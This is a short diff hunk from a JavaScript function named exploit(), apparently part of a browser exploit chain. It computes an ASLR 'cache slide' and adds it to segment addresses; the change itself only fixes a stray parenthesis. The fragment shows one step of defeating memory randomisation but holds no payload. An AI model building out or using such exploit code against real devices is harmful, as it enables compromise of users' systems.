@@ -645,7 +645,7 @@ function exploit(){
         var cache_slide = Sub(hdr, base_seg.addr);
         alert("cache slide" + cache_slide);
         //base_seg.addr = Add(base_seg.addr, cache_slide
-)
+
         for(var i = 0; i < nsegs; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
